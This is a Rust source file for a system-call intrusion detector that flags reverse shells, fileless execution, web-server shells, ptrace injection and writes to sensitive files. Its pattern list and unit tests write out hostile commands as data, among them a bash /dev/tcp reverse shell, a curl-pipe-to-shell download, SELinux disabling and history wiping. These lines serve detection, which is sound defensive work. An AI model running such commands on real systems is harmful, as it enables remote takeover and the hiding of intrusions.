//! What system calls say about an attack, one at a time and in sequence.
//!
//! Process names here come from the kernel, but a program can set its own,
//! so a trusted name lowers suspicion only for things that are routine. The
//! file checks in `host` still run underneath, whoever made the change.

use std::collections::HashMap;
use std::net::{IpAddr, SocketAddr};

use chrono::{DateTime, Local};

use super::event::Event;
use super::program::Kind;
use crate::common::model::Severity;
use crate::defense::{Stage, Threat};

const INTERPRETERS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash", "fish", "busybox", "python", "python3", "perl", "ruby", "php", "lua"];
const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash", "fish", "busybox"];
const WEB_SERVERS: &[&str] = &["nginx", "apache2", "httpd", "lighttpd", "caddy", "uwsgi", "gunicorn", "php-cgi", "tomcat", "java"];
const TEMP_DIRS: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/"];
const DEBUGGERS: &[&str] = &["gdb", "lldb", "strace", "ltrace", "rr", "perf", "procwatch"];
const MODULE_LOADERS: &[&str] = &["modprobe", "kmod", "systemd-udevd", "systemd-modules"];
const CONTAINER_RUNTIMES: &[&str] = &["runc", "crun", "runc:[2:INIT]", "containerd-shim"];
/// Tools whose job is to change these files.
const FILE_MANAGERS: &[&str] = &["dpkg", "apt", "apt-get", "rpm", "dnf", "yum", "pacman", "useradd", "usermod", "userdel", "groupadd", "passwd", "chpasswd", "chage", "visudo", "vipw", "crontab", "cron", "systemd", "cloud-init", "logrotate", "sshd"];
const MINER_PORTS: &[u16] = &[3333, 4444, 5555, 7777, 14433, 14444, 45700];
/// Seconds a connection still counts towards what the process does next.
const SEQUENCE: i64 = 60;
const MAX_TRACKED: usize = 65_536;

const COMMANDS: &[(&str, &[&str])] = &[
    ("reverse shell", &["/dev/tcp/", "/dev/udp/", "nc -e", "ncat -e", "socat exec:", "bash -i >&", "mkfifo /tmp", "import socket,"]),
    ("download and run", &["curl | sh", "curl|sh", "wget -o- |", "wget -qo-", "| sh", "| bash", "|sh", "|bash", "base64 -d |", "base64 --decode |"]),
    ("covering tracks", &["history -c", "unset histfile", "rm -rf /var/log", "shred /var/log", "> /var/log/"]),
    ("weakening the system", &["setenforce 0", "iptables -f", "nft flush ruleset", "ufw disable", "chattr +i", "systemctl stop auditd"]),
    ("crypto mining", &["xmrig", "stratum+tcp://", "--donate-level"]),
];

#[derive(Default)]
struct Tracked {
    socket: Option<(u64, IpAddr, i64)>,
    stdio: u8,
    memfd: bool,
    last: i64,
}

#[derive(Default)]
pub struct Detector {
    include_loopback: bool,
    procs: HashMap<u32, Tracked>,
}

fn name_of(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

fn base(name: &str) -> &str {
    name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.')
}

fn web_server(comm: &str) -> bool {
    WEB_SERVERS.contains(&comm) || comm.starts_with("php-fpm")
}

/// What an open for writing means here, if anything.
fn sensitive(path: &str) -> Option<(&'static str, Severity, Stage)> {
    Some(match path {
        p if p.ends_with("/.ssh/authorized_keys") || p.ends_with("/.ssh/authorized_keys2") => ("ssh-key-write", Severity::High, Stage::Persistence),
        "/etc/ld.so.preload" => ("preload-write", Severity::Critical, Stage::Persistence),
        "/etc/passwd" | "/etc/shadow" | "/etc/group" => ("account-file-write", Severity::High, Stage::Persistence),
        "/etc/ssh/sshd_config" => ("sshd-config-write", Severity::High, Stage::Persistence),
        "/etc/rc.local" => ("startup-write", Severity::Medium, Stage::Persistence),
        p if p == "/etc/sudoers" || p.starts_with("/etc/sudoers.d/") => ("sudoers-write", Severity::High, Stage::Privilege),
        p if p.starts_with("/etc/pam.d/") => ("pam-write", Severity::High, Stage::Persistence),
        p if p.starts_with("/etc/cron") || p.starts_with("/var/spool/cron") => ("cron-write", Severity::Medium, Stage::Persistence),
        p if p.starts_with("/etc/systemd/system/") || p.starts_with("/etc/profile.d/") => ("startup-write", Severity::Medium, Stage::Persistence),
        p if p.starts_with("/var/log/") => ("log-wipe", Severity::High, Stage::Persistence),
        _ => return None,
    })
}

fn command_line(e: &Event) -> String {
    crate::common::redact::command_line(&e.args.join(" "))
}

impl Detector {
    pub fn new(include_loopback: bool) -> Detector {
        Detector { include_loopback, procs: HashMap::new() }
    }

    fn track(&mut self, pid: u32, t: i64) -> &mut Tracked {
        if self.procs.len() >= MAX_TRACKED && !self.procs.contains_key(&pid) {
            self.procs.retain(|_, p| t - p.last < SEQUENCE);
            if self.procs.len() >= MAX_TRACKED {
                self.procs.clear();
            }
        }
        let p = self.procs.entry(pid).or_default();
        p.last = t;
        p
    }

    fn reverse_shell(e: &Event, ip: IpAddr, now: DateTime<Local>, how: &str) -> Threat {
        Threat::new(now, "reverse-shell", Severity::Critical, Stage::Execution, format!("{} ({}) is driven over the network by {ip}", e.comm, e.pid)).source_ip(ip).of_pid(e.pid).with_evidence(how)
    }

    fn exec(&mut self, e: &Event, now: DateTime<Local>) -> Vec<Threat> {
        let mut out = Vec::new();
        let program = name_of(&e.path);
        let shell = SHELLS.contains(&program);
        let interpreter = INTERPRETERS.contains(&program) || INTERPRETERS.contains(&base(program));
        let line = command_line(e);
        let t = now.timestamp();
        if interpreter {
            if let Some(ip) = e.peer {
                out.push(Self::reverse_shell(e, ip, now, &format!("{} started with a network socket as its input: {line}", e.path)));
            }
        }
        let stream = self.procs.get(&e.pid).and_then(|p| p.socket.filter(|s| p.stdio > 0 && t - s.2 < SEQUENCE));
        if let (true, Some((_, ip, _))) = (interpreter && e.peer.is_none(), stream) {
            out.push(Self::reverse_shell(e, ip, now, &format!("connected, moved the socket onto standard input, then ran {}", e.path)));
        }
        if web_server(&e.comm) && (shell || interpreter || TEMP_DIRS.iter().any(|d| e.path.starts_with(d))) {
            out.push(Threat::new(now, "web-server-exec", Severity::High, Stage::Execution, format!("{} started {program}", e.comm)).of_pid(e.pid).with_evidence(&line));
        }
        if TEMP_DIRS.iter().any(|d| e.path.starts_with(d)) {
            out.push(Threat::new(now, "exec-from-temp", Severity::Medium, Stage::Execution, format!("{} ran {}", e.comm, e.path)).of_pid(e.pid).with_evidence(&line));
        }
        let fd_path = e.path.is_empty() || e.path.starts_with("/dev/fd/") || (e.path.starts_with("/proc/") && e.path.contains("/fd/"));
        if fd_path && self.procs.get(&e.pid).is_some_and(|p| p.memfd) && !CONTAINER_RUNTIMES.contains(&e.comm.as_str()) {
            out.push(Threat::new(now, "fileless-execution", Severity::Critical, Stage::Execution, format!("{} ran a program held only in memory", e.comm)).of_pid(e.pid).with_evidence(&line));
        }
        // Judged on what ran; only what is kept is subject to privacy.
        let lower = e.args.join(" ").to_lowercase();
        for (what, patterns) in COMMANDS {
            if patterns.iter().any(|p| lower.contains(p)) {
                out.push(Threat::new(now, "suspicious-command", Severity::High, Stage::Execution, format!("{what}: {}", crate::common::text::truncate(&line, 80))).of_pid(e.pid).with_evidence(format!("started by {}", e.comm)));
                break;
            }
        }
        out
    }

    pub fn feed(&mut self, e: &Event, now: DateTime<Local>) -> Vec<Threat> {
        let t = now.timestamp();
        match e.kind {
            Kind::Exec => return self.exec(e, now),
            Kind::Connect => {
                let Some(addr) = e.addr else { return Vec::new() };
                if addr.ip().is_loopback() && !self.include_loopback {
                    return Vec::new();
                }
                self.track(e.pid, t).socket = Some((e.arg0, addr.ip(), t));
                return Self::connection(e, addr, now);
            }
            Kind::Dup => {
                let p = self.track(e.pid, t);
                let matches = p.socket.is_some_and(|s| s.0 == e.arg0 && t - s.2 < SEQUENCE);
                if !matches {
                    return Vec::new();
                }
                p.stdio |= 1 << e.arg1.min(2);
                // A script does this on its way to a shell of its own; any
                // other program has to do it to two streams to count.
                let enough = INTERPRETERS.contains(&e.comm.as_str()) || INTERPRETERS.contains(&base(&e.comm)) || p.stdio.count_ones() >= 2;
                let ip = p.socket.map(|s| s.1);
                if let (true, Some(ip)) = (enough, ip) {
                    return vec![Self::reverse_shell(e, ip, now, "connected, then moved the socket onto its standard input or output")];
                }
            }
            Kind::Memfd => self.track(e.pid, t).memfd = true,
            Kind::Open => {
                if let Some((rule, severity, stage)) = sensitive(&e.path) {
                    if !FILE_MANAGERS.contains(&e.comm.as_str()) {
                        return vec![Threat::new(now, rule, severity, stage, format!("{} wrote to {}", e.comm, e.path)).of_pid(e.pid).with_evidence(format!("uid {}", e.uid))];
                    }
                }
            }
            Kind::Ptrace => {
                const ATTACH: u64 = 16;
                const SEIZE: u64 = 0x4206;
                const WRITES: [u64; 4] = [4, 5, 6, 13];
                if (e.arg0 == ATTACH || e.arg0 == SEIZE || WRITES.contains(&e.arg0)) && !DEBUGGERS.contains(&e.comm.as_str()) {
                    return vec![Threat::new(now, "process-injection", Severity::High, Stage::Execution, format!("{} is taking control of process {}", e.comm, e.arg1)).of_pid(e.pid).with_evidence(format!("ptrace request {}", e.arg0))];
                }
            }
            Kind::Module => {
                if !MODULE_LOADERS.contains(&e.comm.as_str()) {
                    return vec![Threat::new(now, "kernel-module-insert", Severity::High, Stage::Persistence, format!("{} is loading code into the kernel", e.comm)).of_pid(e.pid)];
                }
            }
        }
        Vec::new()
    }

    fn connection(e: &Event, addr: SocketAddr, now: DateTime<Local>) -> Vec<Threat> {
        if MINER_PORTS.contains(&addr.port()) {
            return vec![Threat::new(now, "suspicious-port", Severity::Medium, Stage::Execution, format!("{} connected to {addr}", e.comm)).source_ip(addr.ip()).of_pid(e.pid).with_evidence("a port used by mining pools and attack tools")];
        }
        Vec::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn at(s: i64) -> DateTime<Local> {
        use chrono::TimeZone;
        Local.timestamp_opt(1_800_000_000 + s, 0).unwrap()
    }

    fn event(kind: Kind, pid: u32, comm: &str, path: &str) -> Event {
        Event { kind, pid, uid: 33, comm: comm.into(), path: path.into(), args: Vec::new(), addr: None, arg0: 0, arg1: 0, peer: None }
    }

    fn exec(comm: &str, path: &str, args: &[&str]) -> Event {
        Event { args: args.iter().map(ToString::to_string).collect(), ..event(Kind::Exec, 100, comm, path) }
    }

    fn rules(d: &mut Detector, e: &Event) -> Vec<&'static str> {
        d.feed(e, at(0)).iter().map(|t| t.rule).collect()
    }

    fn connected(pid: u32, comm: &str, fd: u64, addr: &str) -> Event {
        Event { addr: addr.parse().ok(), arg0: fd, ..event(Kind::Connect, pid, comm, "") }
    }

    fn dup(pid: u32, comm: &str, old: u64, new: u64) -> Event {
        Event { arg0: old, arg1: new, ..event(Kind::Dup, pid, comm, "") }
    }

    /// `bash -i >& /dev/tcp/203.0.113.1/443 0>&1`, as system calls.
    #[test]
    fn a_bash_reverse_shell_is_caught_from_the_sequence() {
        let mut d = Detector::new(false);
        assert!(rules(&mut d, &connected(7, "bash", 3, "203.0.113.1:443")).is_empty());
        let t = d.feed(&dup(7, "bash", 3, 1), at(1));
        assert_eq!((t[0].rule, t[0].source.map(|s| s.to_string())), ("reverse-shell", Some("203.0.113.1".to_string())));
    }

    #[test]
    fn a_compiled_program_needs_two_streams_and_the_same_socket() {
        let mut d = Detector::new(false);
        d.feed(&connected(8, "payload", 5, "203.0.113.1:443"), at(0));
        assert!(rules(&mut d, &dup(8, "payload", 9, 0)).is_empty(), "another descriptor");
        assert!(rules(&mut d, &dup(8, "payload", 5, 0)).is_empty(), "one stream can be innocent");
        assert_eq!(rules(&mut d, &dup(8, "payload", 5, 1)), ["reverse-shell"]);
    }

    #[test]
    fn local_connections_and_old_sockets_do_not_count() {
        let mut d = Detector::new(false);
        d.feed(&connected(9, "bash", 3, "127.0.0.1:443"), at(0));
        assert!(rules(&mut d, &dup(9, "bash", 3, 0)).is_empty());
        d.feed(&connected(10, "bash", 3, "203.0.113.1:443"), at(-120));
        assert!(rules(&mut d, &dup(10, "bash", 3, 0)).is_empty());
    }

    #[test]
    fn a_shell_started_on_a_socket_is_caught() {
        let mut d = Detector::new(false);
        let e = Event { peer: "203.0.113.1".parse().ok(), ..exec("python3", "/bin/sh", &["sh"]) };
        assert_eq!(rules(&mut d, &e), ["reverse-shell"]);
    }

    #[test]
    fn web_servers_should_not_start_shells() {
        let mut d = Detector::new(false);
        assert_eq!(rules(&mut d, &exec("nginx", "/bin/sh", &["sh"])), ["web-server-exec"]);
        assert_eq!(rules(&mut d, &exec("php-fpm8.2", "/usr/bin/python3", &["python3"])), ["web-server-exec"]);
        assert_eq!(rules(&mut d, &exec("nginx", "/tmp/x", &["x"])), ["web-server-exec", "exec-from-temp"]);
        assert!(rules(&mut d, &exec("nginx", "/usr/bin/gzip", &["gzip"])).is_empty());
        assert!(rules(&mut d, &exec("sshd", "/bin/bash", &["bash"])).is_empty());
    }

    #[test]
    fn programs_in_memory_are_caught() {
        let mut d = Detector::new(false);
        rules(&mut d, &event(Kind::Memfd, 100, "loader", "x"));
        assert_eq!(rules(&mut d, &exec("loader", "/proc/self/fd/4", &["x"])), ["fileless-execution"]);
        assert_eq!(rules(&mut d, &exec("loader", "", &["x"])), ["fileless-execution"], "execveat");
        rules(&mut d, &event(Kind::Memfd, 100, "runc", "x"));
        assert!(rules(&mut d, &exec("runc", "/proc/self/fd/4", &["x"])).is_empty());
        let mut clean = Detector::new(false);
        assert!(rules(&mut clean, &exec("bash", "/proc/self/fd/4", &["x"])).is_empty());
    }

    #[test]
    fn commands_are_read_for_intent() {
        let mut d = Detector::new(false);
        for line in ["curl http://e.example/x | sh", "base64 -d | bash", "history -c", "setenforce 0", "bash -c cat </dev/tcp/1.1.1.1/80", "./xmrig -o stratum+tcp://p"] {
            let e = exec("bash", "/bin/sh", &["sh", "-c", line]);
            assert!(rules(&mut d, &e).contains(&"suspicious-command"), "{line}");
        }
        assert!(rules(&mut d, &exec("bash", "/bin/ls", &["ls", "-la"])).is_empty());
    }

    #[test]
    fn writes_name_the_process_that_made_them() {
        let mut d = Detector::new(false);
        let t = d.feed(&event(Kind::Open, 5, "bash", "/root/.ssh/authorized_keys"), at(0));
        assert_eq!((t[0].rule, t[0].title.as_str()), ("ssh-key-write", "bash wrote to /root/.ssh/authorized_keys"));
        assert_eq!(rules(&mut d, &event(Kind::Open, 5, "x", "/etc/ld.so.preload")), ["preload-write"]);
        assert_eq!(rules(&mut d, &event(Kind::Open, 5, "x", "/etc/cron.d/job")), ["cron-write"]);
        assert_eq!(rules(&mut d, &event(Kind::Open, 5, "x", "/var/log/auth.log")), ["log-wipe"]);
        assert!(rules(&mut d, &event(Kind::Open, 5, "dpkg", "/etc/passwd")).is_empty());
        assert!(rules(&mut d, &event(Kind::Open, 5, "logrotate", "/var/log/syslog")).is_empty());
        assert!(rules(&mut d, &event(Kind::Open, 5, "vim", "/etc/hosts")).is_empty());
    }

    #[test]
    fn injection_modules_and_ports() {
        let mut d = Detector::new(false);
        let trace = |comm: &str, req| Event { arg0: req, arg1: 55, ..event(Kind::Ptrace, 5, comm, "") };
        assert_eq!(rules(&mut d, &trace("evil", 16)), ["process-injection"]);
        assert!(rules(&mut d, &trace("gdb", 16)).is_empty());
        assert!(rules(&mut d, &trace("evil", 3)).is_empty(), "a read");
        assert_eq!(rules(&mut d, &event(Kind::Module, 5, "insmod", "")), ["kernel-module-insert"]);
        assert!(rules(&mut d, &event(Kind::Module, 5, "modprobe", "")).is_empty());
        assert_eq!(rules(&mut d, &connected(5, "x", 3, "203.0.113.1:3333")), ["suspicious-port"]);
        assert!(rules(&mut d, &connected(5, "x", 3, "203.0.113.1:443")).is_empty());
    }

    #[test]
    fn tracking_is_bounded() {
        let mut d = Detector::new(false);
        for pid in 0..200_000 {
            d.feed(&connected(pid, "x", 3, "203.0.113.1:443"), at(i64::from(pid) / 1000));
        }
        assert!(d.procs.len() <= MAX_TRACKED);
    }
}
